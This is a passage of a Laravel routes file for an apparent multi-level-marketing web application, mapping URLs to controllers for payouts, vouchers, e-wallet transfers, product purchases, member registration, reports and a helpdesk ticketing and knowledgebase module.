    Route::post('getParentGenealogy/{base64}/{levellimit}', 'GenealogyTreeController@getParentGenealogy');
    Route::post('search/autocomplete', 'GenealogyTreeController@autocomplete');


    
    Route::get('payoutrequest', 'PayoutController@index');
    Route::post('request', 'PayoutController@request');
    Route::get('allpayoutrequest', 'PayoutController@viewall');
    Route::get('reg', 'PayoutController@reg');
    Route::get('requestvoucher', 'VoucherController@index');
    Route::post('vouch-request', 'VoucherController@vouchrequest');
    Route::get('viewvoucher', 'VoucherController@viewvoucher');
    Route::get('myvoucher', 'VoucherController@myvouch');

    Route::get('getPayout', 'PayoutController@getpayout');
    Route::get('income','IncomeDetailsController@index');
    Route::post('income','IncomeDetailsController@index');
    Route::get('fund-transfer','Ewallet@fund');
    Route::post('fund-transfer','Ewallet@fundtransfer');
    Route::get('my-transfer','Ewallet@mytransfer');
    #view-mycode
    Route::get('view-adds','CodeController@index');
    Route::post('view-adds','CodeController@show');
    Route::get('purchase-history','productController@purchasehistory');
    #products
    Route::get('purchase-plan','productController@index');
    Route::post('purchase-plan','productController@purchase');
    Route::get('purchase-history','productController@purchasehistory');

     Route::get('productparchase','productController@getProducts');
   Route::post('product/productparchase','productController@create');
   Route::get('product/producthistory', 'productController@purchaseProducthistory');
   Route::get('product/approverequest', 'productController@purchaseProducthistorydownline');
   Route::get('product/saleshistory', 'productController@saleshistory');
   Route::post('purchasedeleteconfirm', 'productController@purchasedeleteconfirm'); 
   Route::get('product/approve/{id}', 'productController@approve');

    #Register new memeber
    Route::get('register/{placement_id}','RegisterController@index');
    Route::get('register','RegisterController@index');
    Route::post('register','RegisterController@register');
    Route::get('paypal/success/{id}', 'RegisterController@paypalsuccess');
    Route::get('register/preview/{idencrypt}','RegisterController@preview');
    Route::post('register/data/','RegisterController@data');
    Route::get('xpress','RegisterController@xpress');
    #Reports
    Route::get('pvreport','ReportController@pvreport');
    Route::post('pvreport','ReportController@pvreportview');
    Route::get('salereport','ReportController@salereport');
    Route::post('salereport','ReportController@salereportview');
    Route::get('incomereport','ReportController@ewalletreport');
    Route::post('incomereport','ReportController@ewalletreportview');
    Route::get('pairingreport','ReportController@pairingreport');
    Route::post('pairingreport','ReportController@pairingreportview');
    Route::post('carryreport','ReportController@carryreportview');
    Route::get('payoutreport','ReportController@payoutreport');
    Route::post('payoutreport','ReportController@payoutreportview');
    Route::get('transactionreport','ReportController@salereport');
    Route::post('transactionreport','ReportController@salereportview');
    Route::get('summaryreport','ReportController@summuryreport');
    Route::post('summaryreport','ReportController@summuryreportview');
    Route::get('maintenancereport','ReportController@maintenancereport');
    Route::post('maintenancereport','ReportController@maintenancereportview');
    Route::get('groupsalesbonus','ReportController@groupsalesbonus');
    Route::post('groupsalesbonus','ReportController@groupsalesbonusview');
    Route::post('groupsalesbonusdetails/{id}','ReportController@groupsalesbonusdetails');
    Route::get('lead', 'LeadviewController@leadview');
    Route::post('lead','LeadviewController@updatelead');
    Route::post('deletelead', 'LeadviewController@deletelead');
    Route::get('getstatus','LeadviewController@getstatus');
    Route::get('documentdownload', 'DocumentController@download');
    Route::get('download/{name}', 'DocumentController@getDownload');
    #ticket center
 

      
    Route::get('/helpdesk/tickets/kb-categories', 'Helpdesk\Kb\KbCategoryController@index');    
    Route::get('/helpdesk/tickets/kb-categories/{id}', 'Helpdesk\Kb\KbCategoryController@show');    
    Route::post('/helpdesk/tickets/kb-categories/store', 'Helpdesk\Kb\KbCategoryController@store');
    Route::post('/helpdesk/tickets/kb-categories/update', 'Helpdesk\Kb\KbCategoryController@update');
    Route::get('/helpdesk/tickets/kb-categories/destroy/{id}', 'Helpdesk\Kb\KbCategoryController@destroy');
    Route::get('/helpdesk/tickets/kb-categories/data', 'Helpdesk\Kb\KbCategoryController@data');

    /**
     * Knowledgebase - Categories
     */
    /*  For the crud of category  */
    Route::resource('helpdesk/kb/category', 'Helpdesk\kb\CategoryController');    
    /*  For the datatable of category  */
    Route::get('helpdesk/kb/categories/data', ['as' => 'api.category', 'uses' => 'Helpdesk\kb\CategoryController@data']);
    /*  destroy category  */
    Route::get('helpdesk/kb/category/delete/{id}', 'Helpdesk\kb\CategoryController@destroy');
    /**
     * Knowledgebase - Articles
     */    
    /*  For the crud of article  */
    Route::resource('helpdesk/kb/article', 'Helpdesk\kb\Knowledgebase');    
    /*  For the datatable of article  */
    Route::get('helpdesk/kb/articles/data', ['as' => 'api.article', 'uses' => 'Helpdesk\kb\Knowledgebase@data']);
    Route::get('helpdesk/kb/article/delete/{slug}', 'Helpdesk\kb\Knowledgebase@destroy');
    /**
     * Dashboard
     */
    Route::get('/helpdesk/tickets-dashboard', 'Helpdesk\Ticket\TicketsController@index');
    /**
     * All Tickets
     * Using query param, 
     */
    Route::resource('helpdesk/ticket', 'Helpdesk\Ticket\TicketsController');    
    Route::get('helpdesk/tickets/data', 'Helpdesk\Ticket\TicketsController@data');    
    Route::get('helpdesk/ticket/delete/{slug}', 'Helpdesk\Ticket\TicketsController@destroy');
    // Route::get('/helpdesk/tickets/tickets', 'TicketsController@tickets');
    Route::post('helpdesk/ticket/reply/', 'Helpdesk\Ticket\TicketsController@ticketReplyPost');

    Route::get('helpdesk/tickets/overdue/', 'Helpdesk\Ticket\TicketsController@index');
    Route::get('helpdesk/tickets/open/', 'Helpdesk\Ticket\TicketsController@index');
    Route::get('helpdesk/tickets/closed/', 'Helpdesk\Ticket\TicketsController@index');
    Route::get('helpdesk/tickets/resolved/', 'Helpdesk\Ticket\TicketsController@index');
    Route::get('helpdesk/tickets/add/', 'Helpdesk\Ticket\TicketsController@index');    
    /**
     * Ticket functions
     */
    //Change status
    Route::get('helpdesk/tickets/ticket/change-status/', 'Helpdesk\Ticket\TicketsController@changeStatus');    
    //Change priority
    Route::get('helpdesk/tickets/ticket/change-priority/', 'Helpdesk\Ticket\TicketsController@changePriority');    
    //Change owner
    Route::patch('helpdesk/tickets/ticket/change-priority/', 'Helpdesk\Ticket\TicketsController@changeOwner');     
    /**
     * Departments     * 
     */  
    
    /*  For the crud of department  */
    Route::resource('helpdesk/tickets/department', 'Helpdesk\Ticket\TicketsDepartmentsController');    
    Route::get('helpdesk/tickets/departments/destroy/{id}', 'Helpdesk\Ticket\TicketsDepartmentsController@destroy');
    /*  For the datatable of article  */    
    Route::get('/helpdesk/tickets/departments/data','Helpdesk\Ticket\TicketsDepartmentsController@data');    
    /**
     * Categories    * 
     */      
    /*  For the crud of department  */
    Route::resource('helpdesk/tickets/category', 'Helpdesk\Ticket\TicketsCategoriesController');    
    Route::get('helpdesk/tickets/categories/destroy/{id}', 'Helpdesk\Ticket\TicketsCategoriesController@destroy');
    /*  For the datatable of article  */    
    Route::get('/helpdesk/tickets/categories/data','Helpdesk\Ticket\TicketsCategoriesController@data');   
    /**
     * Canned Responses
     * 
     */  
    /*  For the crud of canned responses   */
    Route::resource('helpdesk/tickets/canned-response', 'Helpdesk\Ticket\TicketsCannedResponseController');    
    Route::get('helpdesk/tickets/canned-responses/delete/{id}','Helpdesk\Ticket\TicketsCannedResponseController@destroy');    
    /*  For the datatable of canned responses  */    
    Route::get('/helpdesk/tickets/canned-responses/data','Helpdesk\Ticket\TicketsCannedResponseController@data');
    Route::post('helpdesk/tickets/canned-responses/get-canned-response','Helpdesk\Ticket\TicketsCannedResponseController@getCannedResponse');    

    /*  For the crud of priority management   */
    Route::resource('/helpdesk/tickets/priority', 'Helpdesk\Ticket\TicketsPriorityController');   
    Route::get('helpdesk/tickets/priorities/delete/{id}','Helpdesk\Ticket\TicketsPriorityController@destroy');     
    Route::get('/helpdesk/tickets/priorities/data','Helpdesk\Ticket\TicketsPriorityController@data');
   

    /*  For the crud of ticket-type management   */
    Route::resource('/helpdesk/tickets/ticket-type', 'Helpdesk\Ticket\TicketsTypeController');   
    Route::get('helpdesk/tickets/ticket-types/delete/{id}','Helpdesk\Ticket\TicketsTypeController@destroy');     
    Route::get('/helpdesk/tickets/ticket-types/data','Helpdesk\Ticket\TicketsTypeController@data');

    Route::resource('notes', 'NotesController');    

     
    }); 